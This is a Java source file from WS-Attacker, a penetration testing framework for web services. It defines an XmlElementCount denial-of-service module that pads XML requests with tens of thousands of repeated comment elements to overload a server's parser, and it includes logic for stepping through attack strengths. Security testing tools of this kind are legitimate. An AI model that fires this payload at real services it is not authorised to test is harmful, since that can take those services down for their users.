/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Christian Altmeier
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.intelligentdos.dos;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import wsattacker.library.intelligentdos.common.DoSParam;
import wsattacker.library.intelligentdos.helper.IterateModel;
import wsattacker.library.intelligentdos.helper.IterateModel.IncreaseIncrementStrategie;
import wsattacker.library.intelligentdos.helper.IterateModel.IterateStrategie;

/**
 * @author Christian Altmeier
 */
public class XmlElementCount
    extends AbstractDoSAttack
{

    private static final int MIN_NUMBER_OF_ELEMENTS = 2;

    private final PayloadPosition[] possiblePossitions = { PayloadPosition.ELEMENT };

    // 8192 262144
    private static final IterateModel defaultNumberOfElements =
        IterateModel.custom().startAt( 12500 ).stopAt( 100000 ).setIncrement( 2 ).setIterateStrategie( IterateStrategie.MUL ).setIncreaseIncrementStrategie( IncreaseIncrementStrategie.NO ).build();

    private static final String[] defaultElements = { "<!--X-->" };

    private String[] elements;

    // iterators
    private IterateModel numberOfElements;

    private Iterator<String> elementsIterator;

    // current
    private int currentNumberOfElements;

    private String currentElement;

    public XmlElementCount()
    {
        try
        {
            numberOfElements = defaultNumberOfElements.clone();
        }
        catch ( CloneNotSupportedException e )
        {
            LOG.warn( e );
        }
        elements = defaultElements;
        elementsIterator = Arrays.asList( defaultElements ).iterator();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getName()
     */
    @Override
    public String getName()
    {
        return "XmlElementCount";
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getPossiblePossitions()
     */
    @Override
    public PayloadPosition[] getPossiblePossitions()
    {
        PayloadPosition[] copy = new PayloadPosition[possiblePossitions.length];
        System.arraycopy( possiblePossitions, 0, copy, 0, possiblePossitions.length );
        return copy;
    }

    public IterateModel getNumberOfElementsIterator()
    {
        try
        {
            return numberOfElements.clone();
        }
        catch ( CloneNotSupportedException ex )
        {
            Logger.getLogger( XmlElementCount.class.getName() ).log( Level.SEVERE, null, ex );
        }
        return null;
    }

    public void setNumberOfElementsIterator( IterateModel iterateModel )
    {
        if ( iterateModel == null )
        {
            throw new IllegalArgumentException( "NumberOfElementsIterator may not be null" );
        }

        numberOfElements = iterateModel;
    }

    public String[] getElements()
    {
        String[] copy = new String[elements.length];
        System.arraycopy( elements, 0, copy, 0, elements.length );
        return copy;
    }

    public void setElements( String[] elements )
    {
        if ( elements == null || elements.length == 0 )
        {
            throw new IllegalArgumentException( "elements may not be null" );
        }

        this.elements = new String[elements.length];
        System.arraycopy( elements, 0, this.elements, 0, elements.length );
        this.elementsIterator = Arrays.asList( elements ).iterator();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#hasFurtherParams()
     */
    @Override
    public boolean hasFurtherParams()
    {
        return numberOfElements.hasNext() || elementsIterator.hasNext();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#nextParam()
     */
    @Override
    public void nextParam()
    {
        if ( !initialized )
        {
            currentNumberOfElements = numberOfElements.next();
            currentElement = elementsIterator.next();

            initialized = true;
        }
        else if ( numberOfElements.hasNext() )
        {
            currentNumberOfElements = numberOfElements.next();
        }
        else if ( elementsIterator.hasNext() )
        {
            numberOfElements.reset();
            currentNumberOfElements = numberOfElements.next();

            currentElement = elementsIterator.next();
        }
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getCurrentParam()
     */
    @Override
    public List<DoSParam<?>> getCurrentParams()
    {
        List<DoSParam<?>> list = new ArrayList<DoSParam<?>>();
        list.add( new DoSParam<Integer>( "Number of Elements", currentNumberOfElements ) );
        list.add( new DoSParam<String>( "Name of Elements", currentElement ) );

        return list;
    }

    @Override
    int getCommentLength( PayloadPosition payloadPosition )
    {
        return currentNumberOfElements * currentElement.length();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getTamperedRequest(java .lang.String,
     * wsattacker.library.intelligentdos.dos.DoSAttack.PayloadPosition)
     */
    @Override
    public String getTamperedRequest( String xml, PayloadPosition payloadPosition )
    {
        verifyPayloadPosition( payloadPosition );

        // create payload string with currentNumberOfAttributes attributes
        StringBuilder sb = new StringBuilder();

        // create attribute string
        for ( int i = 0; i < currentNumberOfElements; i++ )
        {
            sb.append( currentElement );
        }

        return payloadPosition.replacePlaceholder( xml, sb.toString() );
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#minimal()
     */
    @Override
    public DoSAttack minimal()
    {
        XmlElementCount xmlElementCount = new XmlElementCount();
        xmlElementCount.currentElement = this.currentElement;
        xmlElementCount.currentNumberOfElements = MIN_NUMBER_OF_ELEMENTS;

        return xmlElementCount;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#middle(wsattacker.library.intelligentdos.dos.DoSAttack)
     */
    @Override
    public DoSAttack middle( DoSAttack aThat )
    {
        if ( this == aThat )
        {
            XmlElementCount xmlElementCount = new XmlElementCount();
            xmlElementCount.currentElement = this.currentElement;
            xmlElementCount.currentNumberOfElements = this.currentNumberOfElements;
            return xmlElementCount;
        }

        if ( !aThat.getClass().equals( getClass() ) || !( aThat instanceof XmlElementCount ) )
        {
            throw new IllegalArgumentException( aThat.getClass() + " is not allowed!" );
        }

        XmlElementCount that = (XmlElementCount) aThat;

        XmlElementCount xmlElementCount = new XmlElementCount();
        xmlElementCount.currentElement = this.currentElement;
        if ( this.currentNumberOfElements == that.currentNumberOfElements )
        {
            xmlElementCount.currentNumberOfElements = this.currentNumberOfElements;
        }
        else
        {
            xmlElementCount.currentNumberOfElements =
                calculateMiddle( this.currentNumberOfElements, that.currentNumberOfElements );
        }

        return xmlElementCount;
    }

    @Override
    public void initialize()
    {
        super.initialize();

        numberOfElements.reset();
        elementsIterator = Arrays.asList( elements ).iterator();
    }

    /*
     * (non-Javadoc)
     * @see java.lang.Comparable#compareTo(java.lang.Object)
     */
    @Override
    public int compareTo( DoSAttack aThat )
    {
        // this optimization is usually worthwhile, and can
        // always be added
        if ( this == aThat )
            return EQUAL;

        if ( !aThat.getClass().equals( getClass() ) )
        {
            return EQUAL;
        }

        XmlElementCount that = (XmlElementCount) aThat;

        if ( this.currentNumberOfElements < that.currentNumberOfElements )
            return BEFORE;
        if ( this.currentNumberOfElements > that.currentNumberOfElements )
            return AFTER;

        return currentElement.compareTo( that.currentElement );
    }

}
